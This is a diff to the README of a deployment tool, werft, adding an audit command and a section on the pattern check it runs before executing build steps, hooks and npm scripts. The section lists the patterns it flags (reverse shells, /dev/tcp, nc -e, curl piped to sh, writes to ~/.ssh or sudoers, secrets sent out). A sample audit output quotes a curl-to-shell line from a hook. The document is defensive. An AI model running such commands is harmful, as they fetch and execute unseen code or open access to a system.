@@ -123,6 +123,7 @@ werft track <dir> [--after cmd] [--restart unit]
 werft untrack <name>
 werft init
 werft validate [file]
+werft audit [dir|name]
 ```
 
 `-y` answers confirmations with yes, `-v` shows the output of build steps live. Without `-v` it goes into a log file and only shows up when something fails.
@@ -136,6 +137,33 @@ werft validate [file]
 5. Backup, write the configuration, run migrations.
 6. `current` now points to the new release, the service restarts, the health check runs.
 7. If any of that fails, everything goes back to the previous version.
+
+## Before anything runs
+
+werft reads every command it is about to execute, on install and before each update: build steps, hooks, migrations, the start command and the npm lifecycle scripts in `package.json`. It looks for the usual tricks:
+
+- a download piped straight into a shell, or base64 that gets decoded and run
+- reverse shells, `/dev/tcp`, `nc -e`
+- writes to `~/.ssh`, `sudoers`, cron, systemd units, shell startup files
+- setuid bits, new user accounts, firewall changes
+- secrets read from the environment and sent somewhere
+- hidden or bidirectional Unicode characters in scripts
+
+```console
+$ sudo werft update notepad
+  git        fetch                        v1.6.0
+
+  v1.5.0 → v1.6.0    3 commits
+
+  audit      commands, hooks, migrations  failed
+    ! .werft/hooks/post_update.sh:7: downloads a script and runs it unseen
+      │ curl -fsSL https://example.net/setup.sh | sh
+  1 critical finding found. Continue anyway? [y/N]
+```
+
+An automatic update stops at this point and leaves a note in the journal. `werft audit .` runs the same check in a project directory, for example in CI.
+
+This is a pattern check, not an antivirus. It catches the sloppy and the common; a carefully written backdoor gets past it. The real protections are the ones werft had anyway: only tags or commits you pushed are installed, changed commands are shown before they run, and `verify_signature` refuses tags that were not signed by you.
 
 ## Updating on a schedule
 
